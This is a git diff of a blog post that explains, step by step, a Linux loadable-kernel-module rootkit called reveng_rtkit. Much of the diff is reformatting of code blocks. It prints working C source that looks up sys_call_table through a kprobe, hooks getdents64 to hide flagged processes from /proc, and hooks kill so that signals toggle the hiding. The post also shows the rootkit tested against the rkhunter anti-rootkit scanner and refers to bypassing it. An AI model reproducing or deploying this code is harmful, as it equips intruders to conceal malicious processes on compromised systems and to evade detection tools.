@@ -1595,13 +1595,13 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
     	int ret = orig_getdents64(pt_regs), err;
 	...
 ```
-linux/slab.h: Will be used to allocate memories in ram for directory entries.
-linux/fdtable.h: For accessing file table structure.
-linux/proc_ns.h: For using `PROC_ROOT_INO`. I will explain it, when the time comes.
+**linux/slab.h**: Will be used to allocate memories in ram for directory entries.\
+**linux/fdtable.h**: For accessing file table structure.\
+**linux/proc_ns.h**: For using `PROC_ROOT_INO`. I will explain it, when the time comes.
 
 Now to the next part:
 ```c
-...
+	...
 	// kernel space related variables
 	unsigned short proc = 0;
 	unsigned long offset = 0; 
@@ -1614,19 +1614,19 @@ Now to the next part:
 		return ret;
 
 	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
-	 * 
+ 	 * 
  	 * kzalloc - allocate memory. The memory is set to zero.
-	 * @size: how many bytes of memory are required.
-	 * @flags: the type of memory to allocate (see kmalloc).
+ 	 * @size: how many bytes of memory are required.
+ 	 * @flags: the type of memory to allocate (see kmalloc).
+ 	 *
+ 	 * static inline void *kzalloc(size_t size, gfp_t flags)
+ 	 */
+	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
 	 *
-	 * static inline void *kzalloc(size_t size, gfp_t flags)
-	 */
-	 /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
-	  *
-	  * Below is a brief outline of the most useful GFP flags
-	  * %GFP_KERNEL
-	  *      Allocate normal kernel ram. May sleep.
-	  */
+ 	 * Below is a brief outline of the most useful GFP flags
+ 	 * %GFP_KERNEL
+ 	 *      Allocate normal kernel ram. May sleep.
+ 	 */
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	
 	if (kdirent == NULL)
@@ -1636,18 +1636,18 @@ Now to the next part:
 	err = copy_from_user(kdirent, dirent, ret);
 	if (err)
 		goto out;
-	 ...
+		...
 
 	err = copy_to_user(dirent, kdirent, ret);
 
-	   if (err)
-	   {
-	     goto out;
-	   }
+		if (err)
+		{
+			goto out;
+		}
 
-	   out:
-	      kfree(kdirent);
-	      return ret;
+	out:
+		kfree(kdirent);
+		return ret;
 ```
 Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.\
 In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.
@@ -1658,12 +1658,12 @@ The last thing, which need explanation is the <ins>error part</ins>. If some err
 
 Next part:
 ```c
-	// Storing the inode value of the required directory(or pid) 
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+// Storing the inode value of the required directory(or pid) 
+d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
+if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+	/*&& MINOR(d_inode->i_rdev) == 1*/)
+	proc = 1;
 	...
 ```
 I paraphrased from [jm33.me](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html):\
@@ -1790,176 +1790,177 @@ static tt_syscall orig_kill;
  /* For storing address of sys_call_table */
 
 unsigned long *get_syscall_table(void)
-	{
-		unsigned long *syscall_table;
+{
+	unsigned long *syscall_table;
 
-	      //Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
+	//Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
       
-	      /* // Lookup the address for a symbol. Returns 0 if not found.
-	      * unsigned long kallsyms_lookup_name(const char *name);
-	      * 
-	      */
-	      typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-      
-	      kallsyms_lookup_name_t kallsyms_lookup_name;
-	      register_kprobe(&kp);
-	      kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-	      unregister_kprobe(&kp);
-
-	      syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-	      return syscall_table;
-	}
-
-	/* Technique taken from: https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5. */
-
-	struct task_struct *find_task(pid_t pid)
-	{
-		struct task_struct *target_process = current;
-
-		/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
-	      	* for loop macro
-      		* #define for_each_process(p) \
-		* for (p = &init_task ; (p = next_task(p)) != &init_task ; )
-	        */
-	      for_each_process(target_process)
-	      {
-        	if (target_process->pid == pid)
-        	{
-          		return target_process;
-	        }
-      	      }
-	      return NULL;
-	}
-
-    static int is_invisible(pid_t pid)
-    {
-      struct task_struct *task;
-
-      if (!pid)
-      {
-        return 0;
-      }
-
-      task = find_task(pid);
-      if (!task)
-      {
-        return 0;
-      }
-      if (task->flags & PF_INVISIBLE)
-      {
-        return 1;
-      }
-      return 0;
-    }
-
-    static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
-    {
-      /* Dependent registers:
-      * rax: contains syscall ids = 0xd9
-      * rdi: which contains the file descriptor = unsigned int fd
-      * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
-      * rdx: length of the passed argument(or string) = unsigned int count
-      */
-
-      // Storing file descriptor to uniquely identifies an open file 
-      int fd = (int) pt_regs->di;
-
-      /* User space related variable
-      * Storing the name of the file in a directory passed from user space via "si" register
-      */
-      struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
-
-      int ret = orig_getdents64(pt_regs), err;
-
-      // kernel space related variables
-      unsigned short proc = 0;
-      unsigned long offset = 0;
-      struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-
-      //For storing the directory inode value
-      struct inode *d_inode;
-
-      if (ret <= 0)
-        return ret;
-
-      /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
+      /* // Lookup the address for a symbol. Returns 0 if not found.
+      * unsigned long kallsyms_lookup_name(const char *name);
       * 
-      * kzalloc - allocate memory. The memory is set to zero.
-      * @size: how many bytes of memory are required.
-      * @flags: the type of memory to allocate (see kmalloc).
-      *
-      * static inline void *kzalloc(size_t size, gfp_t flags)
       */
-      /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
-      *
-      * Below is a brief outline of the most useful GFP flags
-      * %GFP_KERNEL
-      *	Allocate normal kernel ram. May sleep.
-      */
-      kdirent = kzalloc(ret, GFP_KERNEL);
+      typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
-      if (kdirent == NULL)
-        return ret;
+      kallsyms_lookup_name_t kallsyms_lookup_name;
+      register_kprobe(&kp);
+      kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+      unregister_kprobe(&kp);
 
-      // Copying directory name (or pid name) from userspace to kernel space
-      err = copy_from_user(kdirent, dirent, ret);
-      if (err)
-        goto out;
+      syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+      return syscall_table;
+}
 
-      // Storing the inode value of the required directory(or pid) 
-      d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+/* Technique taken from: https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5. */
 
-      if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-        /*&& MINOR(d_inode->i_rdev) == 1*/)
-        proc = 1;
+struct task_struct *find_task(pid_t pid)
+{
+	struct task_struct *target_process = current;
 
-      // Change which we will do
-      while (offset < ret)
-      {
-        dir = (void *)kdirent + offset;
+	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
+	* for loop macro
+	* #define for_each_process(p) \
+	* for (p = &init_task ; (p = next_task(p)) != &init_task ; )
+	*/
+	for_each_process(target_process)
+	{
+		if (target_process->pid == pid)
+        	{
+			return target_process;
+	        }
+	}
+	return NULL;
+}
 
-        if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
-        {
-          if (dir == kdirent)
-          {
-            ret -= dir->d_reclen;
-            memmove(dir, (void *)dir + dir->d_reclen, ret);
-            continue;
-          }
-          prev->d_reclen += dir->d_reclen;
-        }
-        else
-        {
-          prev = dir;
-        }
-        offset += dir->d_reclen;
-      }
-      // Copying directory name (or pid name) from kernel space to user space, after changing 
-      err = copy_to_user(dirent, kdirent, ret);
+static int is_invisible(pid_t pid)
+{
+	struct task_struct *task;
+
+	if (!pid)
+	{
+		return 0;
+	}
+
+	task = find_task(pid);
+	if (!task)
+	{
+		return 0;
+	}
       
-      if (err)
-      {
-        goto out;
-      }
+	if (task->flags & PF_INVISIBLE)
+	{
+		return 1;
+	}
+	return 0;
+}
 
-    out:
-      kfree(kdirent);
-      return ret;
-    }
+static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
+{
+	/* Dependent registers:
+	 * rax: contains syscall ids = 0xd9
+	 * rdi: which contains the file descriptor = unsigned int fd
+	 * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
+	 * rdx: length of the passed argument(or string) = unsigned int count
+	 */
 
-    static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
-    {
-      /* Dependent registers:
-      * rax: contains syscall ids (normally) = 0x3e
-      * rdi: which contains the file descriptor (normally) = pid_t pid (in this case)
-      * rsi: which contains the passed arguments (normally) = int sig
-      */
-      pid_t pid = (pid_t) pt_regs->di;
-      int sig = (int) pt_regs->si;
+	// Storing file descriptor to uniquely identifies an open file 
+	int fd = (int) pt_regs->di;
 
-      struct task_struct *task;
-      switch (sig)
-      {
+	/* User space related variable
+	 * Storing the name of the file in a directory passed from user space via "si" register
+	 */
+	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
+
+	int ret = orig_getdents64(pt_regs), err;
+
+	// kernel space related variables
+	unsigned short proc = 0;
+	unsigned long offset = 0;
+	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+
+	//For storing the directory inode value
+	struct inode *d_inode;
+
+	if (ret <= 0)
+        	return ret;
+
+	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
+	 * 
+	 * kzalloc - allocate memory. The memory is set to zero.
+	 * @size: how many bytes of memory are required.
+	 * @flags: the type of memory to allocate (see kmalloc).
+	 *
+	 * static inline void *kzalloc(size_t size, gfp_t flags)
+	 */
+	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
+	 *
+	 * Below is a brief outline of the most useful GFP flags
+	 * %GFP_KERNEL
+	 * Allocate normal kernel ram. May sleep.
+	 */
+	kdirent = kzalloc(ret, GFP_KERNEL);
+
+	if (kdirent == NULL)
+		return ret;
+
+	// Copying directory name (or pid name) from userspace to kernel space
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
+
+	// Storing the inode value of the required directory(or pid) 
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+        	/*&& MINOR(d_inode->i_rdev) == 1*/)
+        	proc = 1;
+
+	// Change which we will do
+	while (offset < ret)
+	{
+		dir = (void *)kdirent + offset;
+
+		if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
+		{
+			if (dir == kdirent)
+			{
+				ret -= dir->d_reclen;
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				continue;
+			}
+			prev->d_reclen += dir->d_reclen;
+		}
+        	else
+		{
+			prev = dir;
+		}
+		offset += dir->d_reclen;
+	}
+	// Copying directory name (or pid name) from kernel space to user space, after changing 
+	err = copy_to_user(dirent, kdirent, ret);
+      
+	if (err)
+	{
+		goto out;
+	}
+
+	out:
+		kfree(kdirent);
+		return ret;
+}
+
+static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
+{
+	/* Dependent registers:
+	* rax: contains syscall ids (normally) = 0x3e
+	* rdi: which contains the file descriptor (normally) = pid_t pid (in this case)
+	* rsi: which contains the passed arguments (normally) = int sig
+	*/
+	pid_t pid = (pid_t) pt_regs->di;
+	int sig = (int) pt_regs->si;
+
+	struct task_struct *task;
+	switch (sig)
+	{
         case HIDE_UNHIDE_PROCESS:
           if ((task = find_task(pid)) == NULL)
             return -ESRCH;
@@ -1996,8 +1997,9 @@ Testing the Code:
 ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog14.png?raw=true)
 
 Let's see how it performs with ***rkhunter*** antirootkit:
-                   
+
 [![asciicast](https://asciinema.org/a/488606.svg)](https://asciinema.org/a/488606)
+
 I have already explained about the reason behind that one warning in my github [README.md](https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit).
 
 With this, I have come to the end of the blog. I will be updating the blog as soon as I make some changes to my `reveng_rtkit`rootkit.
